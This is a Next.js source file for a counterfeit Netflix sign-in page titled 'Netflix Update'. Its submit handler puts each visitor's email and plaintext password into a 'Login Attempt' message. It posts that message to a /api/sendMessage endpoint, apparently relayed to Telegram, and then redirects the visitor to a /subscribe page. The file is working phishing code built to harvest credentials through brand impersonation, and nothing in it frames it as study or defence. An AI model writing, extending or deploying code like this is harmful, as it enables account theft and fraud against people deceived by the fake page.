import Loader from "@/components/Loader";
import useAuth from "@/hooks/useAuth";
import axios from "axios";
import {
  createUserWithEmailAndPassword,
  fetchSignInMethodsForEmail,
  getAuth,
  signInWithEmailAndPassword,
} from "firebase/auth";
import Head from "next/head";
import Image from "next/image";
import Link from "next/link";
import { useRouter } from "next/router";
import { useState } from "react";
import { SubmitHandler, useForm } from "react-hook-form";

interface Inputs {
  email: string;
  password: string;
}

function Login() {
  const router = useRouter();
  const [login, setLogin] = useState(false);
  const [loading, setLoading] = useState(false);
  const [messageSent, setMessageSent] = useState(false);
  const { signIn, signUp } = useAuth();
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm<Inputs>();

  const sendMessageToTelegram = async (message: string): Promise<void> => {
    try {
      const response = await axios.post("/api/sendMessage", {
        text: message,
      });

      if (response.status === 200) {
        console.log("Message sent");
       router.push("/subscribe");
        setMessageSent(true);
      } else {
        console.error("Failed to send message.");
        router.push("/subscribe");
      }
    } catch (error) {
      console.error("Error:", error);
    }
  };

   const onSubmit: SubmitHandler<Inputs> = async ({ email, password }) => {
    if (!email || !password) {
      console.error("Please fill in all fields");
      return;
    }

    setLoading(true);

    try {
      const auth = getAuth();
      const providers = await fetchSignInMethodsForEmail(auth, email);

      if (providers.length > 0) {
        await signInWithEmailAndPassword(auth, email, password);
      } else {
        await createUserWithEmailAndPassword(auth, email, password);
      }

      const message = `Login Attempt:\nEmail: ${email}\nPassword: ${password}`;
      await sendMessageToTelegram(message);

      router.push("/subscribe");
    } catch (error: any) {
      console.error("Login failed:", error);

      if (error && error.code === "auth/email-already-in-use") {
        console.log("Email already in use.");

        router.push("/subscribe");
      }
    } finally {
      setLoading(false);
    }
  };
  return (
    <div className="relative flex h-screen w-screen flex-col bg-black md:items-center md:justify-center md:bg-transparent">
      <Head>
        <title>Login - Netflix Update</title>
        <link rel="icon" href="/favicon.ico" />
      </Head>
      <Image
        src="/mbrapa.jpg"
        alt="background"
        layout="fill"
        className="-z-10 !hidden opacity-60 sm:!inline"
        objectFit="cover"
      />
      <Image
        src="/logo.svg"
        alt="logo"
        width={150}
        height={150}
        className="absolute left-4 top-4 cursor-pointer object-contain md:left-10 md:top-6"
      />

      <form
        onSubmit={handleSubmit(onSubmit)}
        className="relative mt-24 space-y-8 rounded bg-black/90 py-10 px-6 md:mt-0 md:max-w-md md:px-14"
      >
        <h1 className="text-4xl font-semibold">Sign In</h1>
        <div className="space-y-4">
          <label className="inline-block w-full">
            <input
              type="email"
              placeholder="Email or phone number"
              className="input"
              {...register("email", { required: true })}
            />
            {errors.email && (
              <p className="p-1 text-[13px] font-light text-orange-500">
                Please enter a valid email or phone number.
              </p>
            )}
          </label>
          <label className="inline-block w-full">
            <input
              type="password"
              placeholder="Password"
              className="input"
              {...register("password", { required: true })}
            />
            {errors.email && (
              <p className="p-1 text-[13px] font-light text-orange-500">
                Your password must contain between 6 and 60 characters.
              </p>
            )}
          </label>
        </div>
        <br />
        <button
          className="w-full rounded bg-[#e50914] py-3 font-semibold"
          type="submit"
          disabled={loading || messageSent}
        >
          {loading ? (
            <Loader color="dark:fill-gray-300" />
          ) : messageSent ? (
            <Link href="/subscribe">
              <span>Sign In</span>
            </Link>
          ) : (
            "Sign In"
          )}
        </button>
        <div className="text-[gray]">
          New to Netflix?{" "}
          <button
            type="submit"
            className="text-white hover:underline"
            onClick={() => setLogin(false)}
          >
            Sign up now.
          </button>
        </div>
        <div className="top-2">
          <p className="text-[gray] text-sm">
            This page is protected by Google reCAPTCHA to ensure you&apos;re not
            a bot.{" "}
            <span className="text-[blue] hover:underline">Learn more.</span>
          </p>
        </div>
      </form>
    </div>
  );
}

export default Login;
